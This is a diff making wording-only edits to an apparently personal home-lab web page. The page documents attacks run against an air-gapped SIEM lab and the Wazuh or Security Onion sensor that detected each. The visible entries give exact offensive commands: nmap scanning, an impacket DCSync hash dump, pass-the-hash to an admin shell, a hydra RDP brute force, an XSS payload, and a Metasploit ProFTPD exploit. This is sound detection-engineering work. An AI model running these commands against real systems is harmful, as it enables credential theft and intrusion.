@@ -3,11 +3,11 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Attacks &amp; Detections — Enterprise SIEM Network</title>
-  <meta name="description" content="Ten real attacks run against the air-gapped SIEM Network — the exact commands, targets, and the sensors that detected each one.">
+  <title>Attacks &amp; Detections · Enterprise SIEM Network</title>
+  <meta name="description" content="Ten attacks run against the air-gapped SIEM Network: the exact commands, targets, and the sensors that detected each one.">
   <meta name="author" content="Tristen Dennis">
-  <meta property="og:title" content="Attacks &amp; Detections — Enterprise SIEM Network">
-  <meta property="og:description" content="Ten real attacks — exact commands and what caught each one.">
+  <meta property="og:title" content="Attacks &amp; Detections · Enterprise SIEM Network">
+  <meta property="og:description" content="Ten attacks: exact commands and what caught each one.">
   <meta property="og:type" content="website">
   <link rel="icon" type="image/svg+xml" href="assets/img/logo.svg">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -23,7 +23,7 @@
 
   <nav class="nav">
     <div class="nav-inner">
-      <a class="brand" href="index.html" aria-label="Enterprise SIEM Network — Home">
+      <a class="brand" href="index.html" aria-label="Enterprise SIEM Network Home">
         <img class="monogram" src="assets/img/logo.svg" alt="TD monogram">
         <span class="brand-text"><span class="wordmark">SIEM Network</span><span class="sub">Air-Gapped · Enterprise</span></span>
       </a>
@@ -33,7 +33,7 @@
         <li><a href="gallery.html">Gallery</a></li>
         <li><a href="diagram.html">Diagram</a></li>
         <li><a href="hardware.html">Hardware</a></li>
-        <li><a href="detection-rules.html">Detection Rules</a></li>
+        <li><a href="detection-rules.html">Detection &amp; Config</a></li>
         <li><a href="software.html">Software</a></li>
         <li><a href="attacks.html" class="active">Attacks</a></li>
         <li><a href="documentation.html">Docs</a></li>
@@ -52,7 +52,7 @@
         <div class="attacks">
           <details class="attack reveal" style="--accent:#EF4444;--accent-glow:rgba(239,68,68,0.42);">
             <summary class="attack-head"><span class="attack-num">01</span><span class="attack-title">Nmap Reconnaissance</span><span class="badge recon">T1046</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></summary>
-            <div class="attack-body"><p>Service and version scan across the entire victim subnet to map open ports and running software — the opening move of any intrusion.</p>
+            <div class="attack-body"><p>Service and version scan across the entire victim subnet to map open ports and running software, the opening move of any intrusion.</p>
               <div class="code"><span class="prompt">$</span> nmap -sV 10.0.30.0/24</div>
               <div class="meta"><div><div class="k">Target</div><div class="v">Victim subnet (10.0.30.0/24)</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Security Onion</div></div></div></div>
           </details>
@@ -66,16 +66,16 @@
 
           <details class="attack reveal" style="--accent:#FBBF24;--accent-glow:rgba(251,191,36,0.42);">
             <summary class="attack-head"><span class="attack-num">03</span><span class="attack-title">DCSync</span><span class="badge">T1003.006</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></summary>
-            <div class="attack-body"><p>Abuses domain replication to impersonate a domain controller and dump every account's password hash — full domain compromise.</p>
+            <div class="attack-body"><p>Abuses domain replication to impersonate a domain controller and dump every account's password hash for full domain compromise.</p>
               <div class="code"><span class="prompt">$</span> impacket-secretsdump siemlab.local/reaper:Password123!@10.0.30.10 -just-dc</div>
-              <div class="meta"><div><div class="k">Target</div><div class="v">DC01 — dumped all domain hashes</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Auth events (Wazuh 92652)</div></div></div></div>
+              <div class="meta"><div><div class="k">Target</div><div class="v">DC01 (dumped all domain hashes)</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Auth events (Wazuh 92652)</div></div></div></div>
           </details>
 
           <details class="attack reveal" style="--accent:#34D399;--accent-glow:rgba(52,211,153,0.42);">
             <summary class="attack-head"><span class="attack-num">04</span><span class="attack-title">Pass-the-Hash</span><span class="badge">T1550.002</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></summary>
             <div class="attack-body"><p>Authenticates with a stolen NTLM hash instead of a password, landing a remote shell as administrator without ever cracking it.</p>
               <div class="code"><span class="prompt">$</span> impacket-wmiexec -hashes &lt;hash&gt; siemlab/administrator@10.0.30.40</div>
-              <div class="meta"><div><div class="k">Target</div><div class="v">Win11 (10.0.30.40) — shell as administrator</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Wazuh (92652, 67028) + Security Onion</div></div></div></div>
+              <div class="meta"><div><div class="k">Target</div><div class="v">Win11 (10.0.30.40), shell as administrator</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Wazuh (92652, 67028) + Security Onion</div></div></div></div>
           </details>
 
           <details class="attack reveal" style="--accent:#22D3EE;--accent-glow:rgba(34,211,238,0.42);">
@@ -88,7 +88,7 @@
 
           <details class="attack reveal" style="--accent:#3B82F6;--accent-glow:rgba(59,130,246,0.42);">
             <summary class="attack-head"><span class="attack-num">06</span><span class="attack-title">Cross-Site Scripting (XSS)</span><span class="badge">T1059</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></summary>
-            <div class="attack-body"><p>Injects a script payload that executes in the browser of anyone who views the page — session theft and client-side compromise.</p>
+            <div class="attack-body"><p>Injects a script payload that executes in the browser of anyone who views the page, enabling session theft and client-side compromise.</p>
               <div class="code"><span class="prompt">payload</span> &lt;script&gt;alert('XSS')&lt;/script&gt;</div>
               <div class="meta"><div><div class="k">Target</div><div class="v">DVWA (10.0.30.80)</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Security Onion + Wazuh</div></div></div></div>
           </details>
@@ -102,7 +102,7 @@
 
           <details class="attack reveal" style="--accent:#8B5CF6;--accent-glow:rgba(139,92,246,0.42);">
             <summary class="attack-head"><span class="attack-num">08</span><span class="attack-title">Hydra Brute Force (RDP)</span><span class="badge">T1110</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></summary>
-            <div class="attack-body"><p>Rapid, automated password guessing against Remote Desktop using the rockyou wordlist — the classic credential-stuffing brute force.</p>
+            <div class="attack-body"><p>Rapid, automated password guessing against Remote Desktop using the rockyou wordlist, the classic credential-stuffing brute force.</p>
               <div class="code"><span class="prompt">$</span> hydra -l UPCI -P /usr/share/wordlists/rockyou.txt rdp://10.0.30.40 -t 4</div>
               <div class="meta"><div><div class="k">Target</div><div class="v">Win11 (10.0.30.40)</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Wazuh (60122, 60204) + Security Onion</div></div></div></div>
           </details>
@@ -112,7 +112,7 @@
             <div class="attack-body"><p>Exploits the ProFTPD <code class="inline-code">mod_copy</code> vulnerability for remote code execution, dropping a shell as the web-server user.</p>
               <div class="code"><span class="prompt">msf6 ></span> use exploit/unix/ftp/proftpd_modcopy_exec
 <span class="prompt">msf6 ></span> run   <span class="cmt"># target: Metasploitable (10.0.30.30)</span></div>
-              <div class="meta"><div><div class="k">Target</div><div class="v">Metasploitable — shell as www-data</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Security Onion</div></div></div></div>
+              <div class="meta"><div><div class="k">Target</div><div class="v">Metasploitable (shell as www-data)</div></div><div class="detected"><div class="k">Detected by</div><div class="v">Security Onion</div></div></div></div>
           </details>
 
           <details class="attack reveal" style="--accent:#EC4899;--accent-glow:rgba(236,72,153,0.42);">
